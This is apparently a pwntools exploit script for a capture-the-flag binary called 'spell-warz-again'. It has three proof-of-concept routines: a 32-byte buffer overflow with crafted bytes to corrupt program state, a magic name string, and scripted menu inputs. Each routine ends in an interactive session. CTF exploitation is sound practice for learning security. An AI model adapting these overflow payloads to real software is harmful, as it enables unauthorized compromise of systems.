from pwn import process


def poc0():
    p = process("./spell-warz-again")
    print p.recvuntil(">")
    p.sendline(("A" * 32) + ("\x11\x11\x11\x11\x11\x11\x11\x11\x01"))
    print p.recvuntil(">")
    p.sendline("y")
    print p.recvuntil(">")
    p.sendline("2")
    print p.recvuntil(">")
    p.sendline("4")
    print p.recvuntil(">")
    p.sendline("y")
    for _ in xrange(10):
        print p.recvuntil(">")
        p.sendline("100")
    p.interactive()


def poc1():
    p = process("./spell-warz-again")
    print p.recvuntil(">")
    p.sendline("Leo")
    print p.recvuntil(">")
    p.sendline("y")
    print p.recvuntil(">")
    p.sendline("2")
    print p.recvuntil(">")
    p.sendline("4")
    print p.recvuntil(">")
    p.sendline("y")
    print p.recvuntil(">")
    p.sendline("0")
    p.interactive()


def poc2():
    p = process("./spell-warz-again")
    print p.recvuntil(">")
    p.sendline("__th3_w0rLd_D3str0Y3r__")
    print p.recvuntil(">")
    p.sendline("y")
    print p.recvuntil(">")
    p.sendline("2")
    print p.recvuntil(">")
    p.sendline("4")
    print p.recvuntil(">")
    p.sendline("y")
    for _ in xrange(10):
        print p.recvuntil(">")
        p.sendline("100")
    p.interactive()


if __name__ == "__main__":
    poc0()
